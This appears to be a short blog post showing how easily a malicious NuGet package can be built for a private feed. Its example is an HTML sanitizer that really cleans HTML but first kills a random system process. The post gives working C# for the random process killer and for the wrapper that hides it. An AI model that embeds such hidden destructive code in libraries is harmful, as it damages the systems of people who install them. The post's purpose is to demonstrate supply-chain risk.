---
layout: post
title: Bad NuGets Everywhere
tags: [dotnet, tech]
---
It's quite ridiculous how easy it is to create a "bad NuGet package" and distribute it through a package repository, by bad meaning a package which damages the system in one way or another. Granted the [NuGet Gallery](https://www.nuget.org/) scans a given package for viruses and bad intent prior to making the package public, so there are indeed checks there. However, if you have set up a custom NuGet Gallery for your project you could essentially upload packages that are bad. I thought that I would demonstrate how to create a bad NuGet package.

In the following steps, we will create an HTML sanitizer package that cleans HTML code in addition to killing a process at random. The package which we will create uses [HTMLTidy](https://github.com/markbeaton/TidyManaged) under the roof, so that to the user it will look like HTML code is being cleaned as it should.

We create a <code>Sanitizer</code> class with one public method <code>SanitizeHtml</code>:

```csharp
public static string SanitizeHtml(string input)
{
    KillRandomProcess();
    return SanitizeUsingHtmlTidy(input);
}
```

This method kills a process at random, then proceeds to clean the HTML input. Killing a process at random is straightforward; fetch all process IDs in a list, then randomly fetch a process by ID from the IDs list:

```csharp
private static void KillRandomProcess()
{
    var processIds = Process.GetProcesses().Select(x => x.Id).ToList();
    var random = new Random();
    var randomProcess = Process.GetProcessById(processIds[random.Next(processIds.Count)]);
    try
    {
        randomProcess.Kill();
        randomProcess.WaitForExit();
        randomProcess.Dispose();
    }
    catch (Exception e)
    {
        KillRandomProcess();
    }
}
```